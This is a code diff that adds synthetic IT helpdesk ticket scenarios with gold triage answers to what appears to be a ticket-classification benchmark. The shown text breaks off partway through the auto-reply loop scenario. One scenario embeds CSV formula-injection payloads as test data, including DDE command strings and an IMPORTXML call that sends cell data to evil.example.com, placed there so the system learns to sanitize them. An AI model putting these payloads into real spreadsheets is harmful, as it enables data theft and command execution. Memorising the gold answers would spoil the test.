@@ -5082,4 +5082,1083 @@ DATA_CLEANUP_SCENARIOS: list[ScenarioDefinition] = [
         ),
         tags=("data-cleanup", "vuln-scanner-report"),
     ),
+    # ------------------------------------------------------------------
+    # dc-gen-082  CSV injection patterns in ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-082",
+        subjects=(
+            "Expense report upload failing — see CSV data below",
+            "Issue with payroll CSV — pasted spreadsheet contents",
+        ),
+        descriptions=(
+            "I tried to upload our expense report but the portal keeps"
+            " timing out. Here is the raw CSV so you can see what I'm"
+            " working with:\n\n"
+            "Employee,Amount,Description,Date\n"
+            '=CMD(\'calc.exe\'),1500.00,"Hotel — NYC trip",2025-04-10\n'
+            "\"=HYPERLINK(\"\"http://evil.example.com\"\","
+            "\"\"Click Here\"\")\",2300.00,\"Flights\",2025-04-11\n"
+            "+cmd|'/C calc'!A0,45.00,\"Taxi\",2025-04-11\n"
+            "=1+1,78.00,\"Meals\",2025-04-12\n"
+            "-2+3+cmd|' /C calc'!A0,120.00,\"Dinner\",2025-04-12\n"
+            "@SUM(A1:A10),0.00,\"Subtotal\",2025-04-12\n\n"
+            "The file is about 800 rows total. The portal says 'Request"
+            " Entity Too Large' after spinning for two minutes. Can you"
+            " increase the upload limit or suggest another way to submit?",
+            "Pasting my expense CSV below because the upload keeps failing"
+            " with a 413 error:\n\n"
+            "Name,Cost,Notes\n"
+            "=IMPORTXML(\"http://evil.example.com/steal?\"&A1,\"//a\"),"
+            "999.99,\"formula test\"\n"
+            "=IMAGE(\"http://evil.example.com/track.png\"),0,\"img\"\n"
+            "Normal Entry,50.00,\"Lunch\"\n\n"
+            "The rest of the file is normal. I think the portal has a file"
+            " size limit around 5 MB and my file is 6.2 MB. Running Chrome"
+            " 124 on Windows 11.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+            needs_escalation=False,
+            missing_information=(
+                "error_message",
+                "application_version",
+            ),
+            next_best_action=(
+                "Investigate the 413 upload limit on the expense"
+                " portal and advise the user on alternative"
+                " submission methods — ignore embedded CSV"
+                " injection formulas which are not executable in"
+                " this context"
+            ),
+            remediation_steps=(
+                "Strip or sanitize formula-prefixed cell values"
+                " (=, +, -, @, CMD) before any downstream"
+                " processing of pasted CSV content",
+                "Check the expense portal's upload size limit"
+                " configuration and increase from 5 MB to"
+                " accommodate the 6.2 MB file",
+                "Confirm the 413 Request Entity Too Large error"
+                " is originating from the web server or reverse"
+                " proxy and adjust the max request body size",
+                "Advise the user to submit the CSV via the"
+                " designated file share or SharePoint upload"
+                " as an interim workaround",
+            ),
+        ),
+        tags=("data-cleanup", "csv-injection"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-083  GPG/PGP signed email body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-083",
+        subjects=(
+            "Cannot access shared mailbox — PGP-signed message",
+            "Shared mailbox permissions lost after migration",
+        ),
+        descriptions=(
+            "-----BEGIN PGP SIGNED MESSAGE-----\n"
+            "Hash: SHA256\n\n"
+            "Hi IT Support,\n\n"
+            "After the Exchange migration last weekend I lost access to"
+            " the shared mailbox finance-team@contoso.com. I used to have"
+            " Full Access and Send-As permissions. Now Outlook shows"
+            " 'You don't have permission to open this mailbox.' My own"
+            " mailbox works fine.\n\n"
+            "My account is david.chen@contoso.com and I'm in the Finance"
+            " department. Could you re-add my permissions?\n\n"
+            "Thanks,\nDavid\n"
+            "-----BEGIN PGP SIGNATURE-----\n\n"
+            "iQIzBAEBCAAdFiEEkT3JXYZ1234567890abcdefABCDFiEEkQUUx\n"
+            "wR0FAQEBCAAdFiEEkT3JXYZabcDEFghijklmnopQRSTuvwXYZabcD\n"
+            "EFghijklmnopQRSTuvwXYZabcDEFghijklmnopQRSTuvwXYZa1234\n"
+            "=aBcD\n"
+            "-----END PGP SIGNATURE-----",
+            "-----BEGIN PGP SIGNED MESSAGE-----\n"
+            "Hash: SHA512\n\n"
+            "The shared mailbox (finance-team@contoso.com) stopped working"
+            " for me after the weekend migration. When I try to open it in"
+            " Outlook I get a permissions error. I had Full Access + Send-As"
+            " before. Please restore. — David Chen, Finance Dept.\n\n"
+            "-----BEGIN PGP SIGNATURE-----\n\n"
+            "iHUEARYIAB0WIQRabcDEFghijklmnop1234567890ABCDEFGHIJK\n"
+            "LMNOPQRSTUVWXYZabcdefghijklmnop1234567890ABCDEFGHIJK\n"
+            "=xYzW\n"
+            "-----END PGP SIGNATURE-----",
+        ),
+        gold=ScenarioGold(
+            category="Access & Authentication",
+            priority="P2",
+            assigned_team="Identity & Access Management",
+            needs_escalation=False,
+            missing_information=(
+                "previous_ticket_id",
+                "environment_details",
+            ),
+            next_best_action=(
+                "Restore Full Access and Send-As permissions for"
+                " david.chen@contoso.com on the finance-team"
+                " shared mailbox that were lost during the"
+                " Exchange migration — parse the real request"
+                " from inside the PGP signed envelope"
+            ),
+            remediation_steps=(
+                "Parse the ticket body to extract the actual"
+                " request from between the PGP SIGNED MESSAGE"
+                " headers, ignoring the cryptographic signature"
+                " block",
+                "Verify the user david.chen@contoso.com was"
+                " previously granted Full Access and Send-As on"
+                " finance-team@contoso.com via the pre-migration"
+                " mailbox permission audit logs",
+                "Re-grant Full Access and Send-As permissions"
+                " using Add-MailboxPermission and"
+                " Add-RecipientPermission in Exchange Online"
+                " PowerShell",
+                "Ask the user to restart Outlook and confirm the"
+                " shared mailbox reappears and Send-As works",
+            ),
+        ),
+        tags=("data-cleanup", "pgp-signed-email"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-084  Zalgo text scattered through ticket
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-084",
+        subjects=(
+            "M\u0336\u0318y\u0337\u031e l\u0335\u0326a\u0336\u031fp\u0334\u0320t\u0338\u0325o\u0337\u0319p\u0336\u031f keeps crashing",
+            "Laptop blue-screens every morning — garbled display",
+        ),
+        descriptions=(
+            "H\u0336\u0318e\u0337\u031el\u0335\u0326l\u0336\u031fo\u0334\u0320,"
+            " m\u0338\u0325y\u0337\u0319 l\u0336\u031fa\u0335\u031ep\u0334\u0320t"
+            "\u0338\u0325o\u0337\u0319p\u0336\u031f keeps crashing with a blue"
+            " screen every morning around 9 AM when I connect to the"
+            " docking station. The BSOD shows DRIVER_IRQL_NOT_LESS_OR"
+            "_EQUAL and then it r\u0336\u0318e\u0337\u031es\u0335\u0326t"
+            "\u0336\u031fa\u0334\u0320r\u0338\u0325t\u0337\u0319s. I'm using a"
+            " Dell Latitude 5540 with Windows 11 23H2 and a WD19TBS dock."
+            " The c\u0336\u0318r\u0337\u031ea\u0335\u0326s\u0336\u031fh"
+            " dump is in C:\\Windows\\Minidump. This has happened every day"
+            " this week. P\u0334\u0320l\u0338\u0325e\u0337\u0319a\u0336\u031fs"
+            "\u0335\u031ee help.",
+            "My laptop gets a blue screen DRIVER_IRQL_NOT_LESS_OR_EQUAL"
+            " when I dock it every morning. Dell Latitude 5540, Win11"
+            " 23H2, WD19TBS dock. Started this week. The text on my"
+            " screen sometimes looks c\u0336o\u0337r\u0335r\u0336u\u0334p"
+            "\u0338t\u0337e\u0336d before the crash.",
+        ),
+        gold=ScenarioGold(
+            category="Hardware & Peripherals",
+            priority="P2",
+            assigned_team="Endpoint Engineering",
+            needs_escalation=False,
+            missing_information=(
+                "device_info",
+                "error_message",
+            ),
+            next_best_action=(
+                "Investigate DRIVER_IRQL_NOT_LESS_OR_EQUAL BSOD"
+                " triggered when docking Dell Latitude 5540 with"
+                " WD19TBS — strip Zalgo combining characters and"
+                " focus on the dock driver conflict"
+            ),
+            remediation_steps=(
+                "Normalize the ticket body by stripping Unicode"
+                " combining characters (U+0300–U+036F and"
+                " U+0316–U+0338) to recover clean text",
+                "Collect the minidump from"
+                " C:\\Windows\\Minidump and analyze with WinDbg"
+                " to identify the faulting driver",
+                "Update the WD19TBS dock firmware and the Dell"
+                " Thunderbolt controller driver to the latest"
+                " versions from Dell support",
+                "If the BSOD persists, test with a different"
+                " docking station to isolate hardware vs. driver",
+            ),
+        ),
+        tags=("data-cleanup", "zalgo-text"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-085  Nested JSON payload as ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-085",
+        subjects=(
+            "API gateway returning 502 — raw JSON dump attached",
+            "Prod API 502 Bad Gateway — see error payload",
+        ),
+        descriptions=(
+            '{"timestamp":"2025-05-18T14:32:01Z","level":"ERROR",'
+            '"service":"api-gateway","traceId":"abc123def456",'
+            '"spanId":"789ghi","message":"upstream connect error'
+            ' or disconnect/reset before headers. reset reason:'
+            ' connection termination","details":{"downstream":'
+            '{"method":"POST","path":"/api/v2/orders","host":'
+            '"api.contoso.com","status":502},"upstream":{"cluster":'
+            '"order-service","address":"10.20.3.45:8080","response'
+            '_flags":"UC","attempts":3},"metadata":{"x-request-id":'
+            '"req-98765","user-agent":"ContosoMobileApp/3.2.1",'
+            '"x-forwarded-for":"203.0.113.42"}},"nested":{"retry'
+            '_policy":{"max_retries":3,"backoff_ms":500},"circuit'
+            '_breaker":{"state":"half-open","failures":12,"threshold"'
+            ':10},"health_check":{"last_success":"2025-05-18T14:28:00Z"'
+            ',"consecutive_failures":4}}}\n\n'
+            "The above JSON is from our API gateway logs. The /api/v2/"
+            "orders endpoint has been returning 502 errors for the last"
+            " 4 minutes. The circuit breaker is half-open after 12"
+            " failures. Customers are unable to place orders. This is"
+            " production and customer-facing.",
+            "Getting 502 Bad Gateway on our orders API. The gateway logs"
+            " show the upstream order-service at 10.20.3.45:8080 is"
+            " resetting connections. Circuit breaker hit threshold (12"
+            " failures vs. threshold of 10). Customer orders are failing."
+            " The full JSON error payload was pasted above — nested 4"
+            " levels deep. This started at 14:28 UTC and is ongoing.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P1",
+            assigned_team="Enterprise Applications",
+            needs_escalation=True,
+            missing_information=(
+                "environment_details",
+                "configuration_details",
+            ),
+            next_best_action=(
+                "Investigate the upstream order-service at"
+                " 10.20.3.45:8080 causing 502 errors on the"
+                " production API gateway — circuit breaker is"
+                " tripped and customer orders are failing"
+            ),
+            remediation_steps=(
+                "Parse the nested JSON payload to extract the"
+                " actionable fields: upstream address, circuit"
+                " breaker state, and consecutive failure count",
+                "Check the health of the order-service pod at"
+                " 10.20.3.45:8080 — review container logs and"
+                " restart if it is in a crash loop",
+                "Reset the circuit breaker to closed state once"
+                " the upstream service is healthy and verify"
+                " with a test request to /api/v2/orders",
+                "Monitor the endpoint for 15 minutes to confirm"
+                " stability and that the 502 error rate drops"
+                " to zero before closing the incident",
+            ),
+        ),
+        tags=("data-cleanup", "nested-json"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-086  SQL query output pasted as ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-086",
+        subjects=(
+            "Database slowness — query plan output pasted below",
+            "SQL Server performance issue — see execution plan",
+        ),
+        descriptions=(
+            "Our nightly reporting job has been running for 6 hours"
+            " instead of the usual 45 minutes. I ran the execution plan"
+            " and pasted it here:\n\n"
+            "StmtText\n"
+            "------------------------------------------------------------------------\n"
+            "SELECT o.OrderID, c.CustomerName, p.ProductName,"
+            " SUM(od.Quantity * od.UnitPrice) AS Total\n"
+            "FROM Orders o\n"
+            "  INNER JOIN Customers c ON o.CustomerID = c.CustomerID\n"
+            "  INNER JOIN OrderDetails od ON o.OrderID = od.OrderID\n"
+            "  INNER JOIN Products p ON od.ProductID = p.ProductID\n"
+            "WHERE o.OrderDate BETWEEN '2024-01-01' AND '2025-05-18'\n"
+            "GROUP BY o.OrderID, c.CustomerName, p.ProductName\n"
+            "ORDER BY Total DESC\n\n"
+            "|--Sort(ORDER BY:([Total] DESC))\n"
+            "   |--Hash Match(Aggregate)\n"
+            "      |--Hash Match(Inner Join)\n"
+            "         |--Hash Match(Inner Join)\n"
+            "            |--Hash Match(Inner Join)\n"
+            "               |--Clustered Index Scan(Orders) [Rows: 12.4M]\n"
+            "               |--Table Scan(Customers) [Rows: 890K]\n"
+            "            |--Table Scan(OrderDetails) [Rows: 48.7M]\n"
+            "         |--Index Seek(Products) [Rows: 15.2K]\n\n"
+            "Table 'OrderDetails'. Scan count 1, logical reads 2,847,291.\n"
+            "Table 'Orders'. Scan count 1, logical reads 1,102,445.\n"
+            "Table 'Customers'. Scan count 1, logical reads 342,108.\n\n"
+            "SQL Server Execution Times: CPU time = 1,847,293 ms,"
+            " elapsed time = 21,600,000 ms.\n\n"
+            "The DB is SQL Server 2019 on a 64 GB server. The Orders"
+            " table has 12.4 million rows and OrderDetails has 48.7"
+            " million. No indexes on OrderDate.",
+            "Nightly report query is timing out. It joins Orders (12.4M"
+            " rows) with OrderDetails (48.7M) and Customers (890K). The"
+            " execution plan shows full table scans on all three large"
+            " tables. No index on Orders.OrderDate. SQL Server 2019,"
+            " 64 GB RAM. The job used to finish in 45 minutes but now"
+            " takes 6+ hours. I pasted the full execution plan in the"
+            " ticket.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Data Platform",
+            needs_escalation=False,
+            missing_information=(
+                "environment_details",
+                "configuration_details",
+            ),
+            next_best_action=(
+                "Analyze the pasted SQL execution plan and"
+                " address the missing index on Orders.OrderDate"
+                " causing full table scans on 12.4M and 48.7M"
+                " row tables"
+            ),
+            remediation_steps=(
+                "Extract the key performance metrics from the"
+                " pasted execution plan — focus on the table"
+                " scans with millions of logical reads",
+                "Create a non-clustered index on"
+                " Orders.OrderDate to eliminate the clustered"
+                " index scan on the 12.4M-row Orders table",
+                "Evaluate whether a covering index on"
+                " OrderDetails(OrderID, ProductID) INCLUDE"
+                " (Quantity, UnitPrice) can reduce the 48.7M-row"
+                " table scan",
+                "Re-run the nightly report query and verify"
+                " execution time drops back to the expected"
+                " 45-minute window",
+                "Set up a SQL Agent alert for any query"
+                " exceeding 2 hours elapsed time on this"
+                " database",
+            ),
+        ),
+        tags=("data-cleanup", "sql-query-output"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-087  S/MIME signature wrapping real ticket content
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-087",
+        subjects=(
+            "VPN token expired — S/MIME signed request",
+            "Need VPN token renewal — signed email",
+        ),
+        descriptions=(
+            "Content-Type: multipart/signed;"
+            " protocol=\"application/pkcs7-signature\";"
+            " micalg=sha-256;"
+            " boundary=\"----=_Part_8837_1234567890\"\n\n"
+            "------=_Part_8837_1234567890\n"
+            "Content-Type: text/plain; charset=UTF-8\n"
+            "Content-Transfer-Encoding: quoted-printable\n\n"
+            "Hi Support,\n\n"
+            "My RSA SecurID hardware token expired yesterday"
+            " (serial SN-004817293). It no longer generates"
+            " valid codes and I cannot authenticate to the VPN."
+            " I need a replacement token or a temporary soft"
+            " token so I can work remotely this week.\n\n"
+            "Employee ID: E-20481\n"
+            "Department: Legal\n"
+            "Manager: Sarah Kim\n\n"
+            "Thanks,\nJames Park\n\n"
+            "------=_Part_8837_1234567890\n"
+            "Content-Type: application/pkcs7-signature;"
+            " name=smime.p7s\n"
+            "Content-Transfer-Encoding: base64\n"
+            "Content-Disposition: attachment;"
+            " filename=smime.p7s\n\n"
+            "MIIFvgYJKoZIhvcNAQcCoIIFrzCCBasCAQExDTALBglg\n"
+            "hkgBZQMEAgEwCwYJKoZIhvcNAQcBoIIDkTCCA40wggJ1\n"
+            "oAMCAQICEAm5678abcDEFghijklmnop90wDQYJKoZIhvc\n"
+            "------=_Part_8837_1234567890--",
+            "My RSA hardware token (SN-004817293) stopped"
+            " working yesterday — codes are rejected by the VPN"
+            " gateway. I need a replacement or temp soft token"
+            " ASAP since I'm fully remote this week. This email"
+            " is S/MIME signed; the real content is in the first"
+            " MIME part. — James Park, Legal, Employee E-20481",
+        ),
+        gold=ScenarioGold(
+            category="Access & Authentication",
+            priority="P2",
+            assigned_team="Identity & Access Management",
+            needs_escalation=False,
+            missing_information=(
+                "authentication_method",
+                "device_info",
+            ),
+            next_best_action=(
+                "Issue a replacement RSA SecurID token or"
+                " temporary soft token for James Park (E-20481)"
+                " whose hardware token SN-004817293 has expired"
+                " — extract the request from inside the S/MIME"
+                " envelope"
+            ),
+            remediation_steps=(
+                "Parse the S/MIME multipart body to extract the"
+                " text/plain content from the first MIME part,"
+                " ignoring the pkcs7-signature attachment",
+                "Verify employee E-20481 (James Park, Legal) in"
+                " the HR directory and confirm manager approval"
+                " from Sarah Kim for token reissuance",
+                "Provision a temporary RSA SecurID soft token via"
+                " the RSA Security Console to restore VPN access"
+                " within 4 hours",
+                "Ship a replacement hardware token and schedule"
+                " deactivation of the expired SN-004817293"
+                " serial in the RSA admin portal",
+            ),
+        ),
+        tags=("data-cleanup", "smime-signature"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-088  Near-empty body with only a subject line
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-088",
+        subjects=(
+            "URGENT: everything is down",
+            "HELP!!!",
+        ),
+        descriptions=(
+            ".",
+            "   \n\n \n  ",
+        ),
+        gold=ScenarioGold(
+            category="General Inquiry",
+            priority="P4",
+            assigned_team="None",
+            needs_escalation=False,
+            missing_information=(
+                "affected_system",
+                "error_message",
+                "steps_to_reproduce",
+                "contact_info",
+                "business_impact",
+            ),
+            next_best_action=(
+                "Reply to the submitter requesting a description"
+                " of the issue — the ticket body is effectively"
+                " empty despite the urgent subject line"
+            ),
+            remediation_steps=(
+                "Acknowledge receipt of the ticket and note that"
+                " the body contains no actionable information",
+                "Request the submitter provide: the affected"
+                " system or service, what is not working, when"
+                " the issue started, and how many users are"
+                " impacted",
+                "If no response within 2 hours and the subject"
+                " indicates urgency, attempt to reach the"
+                " submitter by phone or Teams to clarify",
+                "Re-triage with appropriate category and"
+                " priority once details are provided",
+            ),
+        ),
+        tags=("data-cleanup", "near-empty-body"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-089  JIRA notification auto-forwarded as ticket
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-089",
+        subjects=(
+            "FW: [JIRA] (INFRA-4821) Assign: Disk space critical on db-prod-07",
+            "[JIRA] Updated: (INFRA-4821) Disk space alert",
+        ),
+        descriptions=(
+            "---------- Forwarded message ----------\n"
+            "From: jira@contoso.atlassian.net\n"
+            "Date: Tue, May 20, 2025 at 3:14 AM\n"
+            "Subject: [JIRA] (INFRA-4821) Assigned to you: Disk"
+            " space critical on db-prod-07\n\n"
+            "Assignee changed from Unassigned to you.\n\n"
+            "Key: INFRA-4821\n"
+            "URL: https://contoso.atlassian.net/browse/INFRA-4821\n"
+            "Project: Infrastructure\n"
+            "Issue Type: Incident\n"
+            "Priority: Critical\n"
+            "Reporter: Monitoring Bot\n"
+            "Assignee: Priya Nair\n"
+            "Created: 2025-05-20 03:10 UTC\n\n"
+            "Description:\n"
+            "Nagios alert: /data partition on db-prod-07"
+            " (10.30.4.7) is at 96% utilization. Current free"
+            " space: 18 GB of 500 GB. Growth rate: ~4 GB/day."
+            " Estimated time to full: 4.5 days. This host runs"
+            " the primary PostgreSQL 15 database for the orders"
+            " service.\n\n"
+            "—\nThis message was sent by Atlassian Jira"
+            " (v9.12.4#9120004)\n"
+            "If you do not wish to receive these emails, update"
+            " your notification preferences:\n"
+            "https://contoso.atlassian.net/secure/MyPreferences!default.jspa",
+            "Someone forwarded a JIRA notification to the IT"
+            " helpdesk. The actual issue is that db-prod-07"
+            " (10.30.4.7) has its /data partition at 96% full"
+            " with only 18 GB free. It hosts the production"
+            " PostgreSQL 15 database for orders. Growth is ~4"
+            " GB/day so it will be full in 4.5 days.",
+        ),
+        gold=ScenarioGold(
+            category="Data & Storage",
+            priority="P2",
+            assigned_team="Data Platform",
+            needs_escalation=False,
+            missing_information=(
+                "environment_details",
+                "configuration_details",
+            ),
+            next_best_action=(
+                "Address the /data partition on db-prod-07"
+                " reaching 96% utilization before the production"
+                " PostgreSQL database runs out of disk in 4.5"
+                " days — extract the real alert from the JIRA"
+                " notification boilerplate"
+            ),
+            remediation_steps=(
+                "Strip the JIRA notification boilerplate to"
+                " extract the actionable alert: /data partition"
+                " at 96% on db-prod-07 (10.30.4.7)",
+                "Immediately free space by removing old WAL"
+                " archives, temp files, and completed pg_dump"
+                " files from the /data partition",
+                "Evaluate extending the /data logical volume if"
+                " the underlying storage has unallocated space",
+                "Review PostgreSQL autovacuum and log rotation"
+                " settings to reduce ongoing disk growth rate",
+                "Set up a lower-threshold alert at 85% to"
+                " provide earlier warning before reaching"
+                " critical levels",
+            ),
+        ),
+        tags=("data-cleanup", "jira-notification"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-090  Windows registry export pasted in ticket
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-090",
+        subjects=(
+            "Outlook keeps resetting my default signature — reg export",
+            "Signature settings won't stick — registry dump inside",
+        ),
+        descriptions=(
+            "Every time I restart Outlook my email signature reverts to"
+            " the old one. I exported the registry keys you might need:\n\n"
+            "Windows Registry Editor Version 5.00\n\n"
+            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0"
+            "\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
+            "\\00000002]\n"
+            '"New Signature"="OldSignature"\n'
+            '"Reply-Forward Signature"="OldSignature"\n\n'
+            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0"
+            "\\Common\\MailSettings]\n"
+            '"NewSignature"="UpdatedSignature2025"\n'
+            '"ReplySignature"="UpdatedSignature2025"\n\n'
+            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0"
+            "\\Outlook\\Setup]\n"
+            '"First-Run"=dword:00000001\n\n'
+            "I've set it to 'UpdatedSignature2025' but it always goes"
+            " back to 'OldSignature'. Running Office 365 ProPlus"
+            " 16.0.17928.20114 on Windows 11. Group Policy might be"
+            " overriding it?",
+            "Outlook signature resets on every launch. The profile"
+            " registry key under"
+            " ...\\9375CFF0413111d3B88A00104B2A6676\\00000002 has"
+            " 'New Signature'=\"OldSignature\" but I keep changing"
+            " it to 'UpdatedSignature2025'. I think GPO is pushing"
+            " the old value. Office 365 ProPlus, Windows 11.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Endpoint Engineering",
+            needs_escalation=False,
+            missing_information=(
+                "configuration_details",
+                "environment_details",
+            ),
+            next_best_action=(
+                "Investigate whether Group Policy is overwriting"
+                " the Outlook signature registry keys on every"
+                " login — the profile key reverts despite manual"
+                " changes"
+            ),
+            remediation_steps=(
+                "Parse the registry export to identify the"
+                " conflict between the profile-level signature"
+                " setting (OldSignature) and the MailSettings"
+                " key (UpdatedSignature2025)",
+                "Run gpresult /h on the user's machine to check"
+                " for a Group Policy Object that sets the"
+                " Outlook signature registry values",
+                "If a GPO is confirmed, request an exception or"
+                " update the GPO to allow user-defined"
+                " signatures for this user's OU",
+                "Verify the fix persists across an Outlook"
+                " restart and a full machine reboot",
+            ),
+        ),
+        tags=("data-cleanup", "registry-export"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-091  Deep Python traceback as ticket body
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-091",
+        subjects=(
+            "ETL pipeline failing — full traceback below",
+            "Nightly data pipeline crash — Python traceback",
+        ),
+        descriptions=(
+            "The nightly ETL pipeline crashed at 02:17 UTC. Here's the"
+            " full traceback:\n\n"
+            "Traceback (most recent call last):\n"
+            '  File "/opt/etl/main.py", line 42, in <module>\n'
+            "    run_pipeline(config)\n"
+            '  File "/opt/etl/pipeline.py", line 118, in run_pipeline\n'
+            "    result = stage_transform(df, mappings)\n"
+            '  File "/opt/etl/stages/transform.py", line 87, in'
+            " stage_transform\n"
+            "    enriched = enrich_customer_data(df, api_client)\n"
+            '  File "/opt/etl/stages/enrichment.py", line 203, in'
+            " enrich_customer_data\n"
+            "    response = api_client.post(\"/v2/enrich\", payload="
+            "batch)\n"
+            '  File "/opt/etl/clients/api.py", line 56, in post\n'
+            "    return self._request(\"POST\", endpoint, json=payload)\n"
+            '  File "/opt/etl/clients/api.py", line 41, in _request\n'
+            "    resp.raise_for_status()\n"
+            '  File "/opt/venv/lib/python3.11/site-packages/requests/'
+            'models.py", line 1021, in raise_for_status\n'
+            "    raise HTTPError(http_error_msg, response=self)\n"
+            "requests.exceptions.HTTPError: 503 Server Error: Service"
+            " Unavailable for url: https://enrich.internal.contoso.com"
+            "/v2/enrich\n\n"
+            "The enrichment API (enrich.internal.contoso.com) seems to be"
+            " down. This blocks the entire pipeline — ~2.3 million"
+            " customer records were not processed. The downstream"
+            " reporting dashboard will show stale data.",
+            "ETL pipeline failure. Python traceback shows a 503 from"
+            " https://enrich.internal.contoso.com/v2/enrich. The call"
+            " chain is main.py → pipeline.py → transform.py →"
+            " enrichment.py → api.py. 2.3M customer records not"
+            " processed. The traceback is 12 frames deep but the root"
+            " cause is the enrichment API being unavailable.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P2",
+            assigned_team="Enterprise Applications",
+            needs_escalation=False,
+            missing_information=(
+                "environment_details",
+                "affected_users",
+            ),
+            next_best_action=(
+                "Investigate why the enrichment API at"
+                " enrich.internal.contoso.com is returning 503"
+                " and blocking the nightly ETL pipeline that"
+                " processes 2.3M customer records"
+            ),
+            remediation_steps=(
+                "Parse the deep Python traceback to identify"
+                " the root cause: a 503 Service Unavailable"
+                " from the /v2/enrich endpoint at"
+                " enrich.internal.contoso.com",
+                "Check the health and logs of the enrichment"
+                " API service — verify pod status, recent"
+                " deployments, and resource utilization",
+                "Once the enrichment API is restored, re-run"
+                " the ETL pipeline for the missed nightly batch"
+                " to process the 2.3M pending records",
+                "Add retry logic with exponential backoff to"
+                " the ETL API client so transient 503 errors do"
+                " not immediately fail the entire pipeline",
+                "Verify the downstream reporting dashboard"
+                " refreshes with current data after the re-run",
+            ),
+        ),
+        tags=("data-cleanup", "deep-traceback"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-092  Long tracking/marketing URLs obscuring content
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-092",
+        subjects=(
+            "Can't access training portal — link doesn't work",
+            "Training site gives 403 error",
+        ),
+        descriptions=(
+            "I'm trying to complete my mandatory security awareness"
+            " training but the link from the email doesn't work. Here's"
+            " the URL I'm clicking:\n\n"
+            "https://click.email.contoso.com/CL0/"
+            "https:%2F%2Ftraining.contoso.com%2Fcourses%2Fsec-aware-2025"
+            "/1/0102019abc123def-4567-89ab-cdef-0123456789ab-000000/"
+            "aHR0cHM6Ly90cmFpbmluZy5jb250b3NvLmNvbS9jb3Vyc2VzL3NlYy"
+            "1hd2FyZS0yMDI1P3V0bV9zb3VyY2U9ZW1haWwmdXRtX21lZGl1bT1j"
+            "bGljayZ1dG1fY2FtcGFpZ249c2VjLXRyYWluaW5nLTIwMjUmc2lkPT"
+            "EyMzQ1Njc4OSZ1aWQ9am9obi5kb2VAY29udG9zby5jb20="
+            "?utm_source=email&utm_medium=click&utm_campaign="
+            "sec-training-2025&sid=123456789&uid=john.doe%40contoso.com"
+            "&eid=evt-9876&mid=msg-5432&rid=rec-1111\n\n"
+            "It redirects a few times and then I get a 403 Forbidden"
+            " page. The actual training site is training.contoso.com."
+            " I need to complete this by Friday or I'll be flagged"
+            " as non-compliant.",
+            "The security training link from the email blast doesn't"
+            " work. The URL is extremely long with tracking parameters"
+            " and base64 in the path. It eventually redirects to"
+            " training.contoso.com but I get 403 Forbidden. My"
+            " compliance deadline is Friday. Going directly to"
+            " training.contoso.com/courses/sec-aware-2025 also gives"
+            " 403.",
+        ),
+        gold=ScenarioGold(
+            category="Software & Applications",
+            priority="P3",
+            assigned_team="Enterprise Applications",
+            needs_escalation=False,
+            missing_information=(
+                "error_message",
+                "authentication_method",
+            ),
+            next_best_action=(
+                "Investigate the 403 Forbidden error on"
+                " training.contoso.com for the user — strip the"
+                " tracking URL parameters to identify the actual"
+                " destination and check access permissions"
+            ),
+            remediation_steps=(
+                "Decode the tracking URL to extract the actual"
+                " destination: training.contoso.com/courses/"
+                "sec-aware-2025 — ignore the marketing"
+                " parameters and base64 tracking segments",
+                "Check whether the user's account has been"
+                " provisioned in the training portal's access"
+                " control list",
+                "Verify the training course sec-aware-2025 is"
+                " still active and has not expired or been"
+                " replaced by a newer version",
+                "Grant the user access and confirm they can"
+                " reach the course before the Friday compliance"
+                " deadline",
+            ),
+        ),
+        tags=("data-cleanup", "tracking-urls"),
+    ),
+    # ------------------------------------------------------------------
+    # dc-gen-093  Auto-reply chain creating infinite loop
+    # ------------------------------------------------------------------
+    ScenarioDefinition(
+        scenario_id="dc-gen-093",
+        subjects=(
+            "RE: RE: RE: RE: Automatic reply: Out of Office",
+            "Auto-reply loop — mailbox full",
+        ),
+        descriptions=(
+            "Automatic reply: I am currently out of the office with"
+            " limited access to email. I will return on June 2.\n\n"
+            "--- Original Message ---\n"
+            "From: no-reply@contoso.com\n"
+            "Subject: RE: Automatic reply: Out of Office\n\n"
+            "Thank you for contacting IT Support. Your ticket has been"
+            " received. Reference: INC-003847.\n\n"
+            "--- Original Message ---\n"
+            "From: anna.kovacs@contoso.com\n"
+            "Subject: Automatic reply: Out of Office\n\n"
+            "I am currently out of the office with limited access to"
+            " email. I will return on June 2.\n\n"
+            "--- Original Message ---\n"
+            "From: no-reply@contoso.com\n"
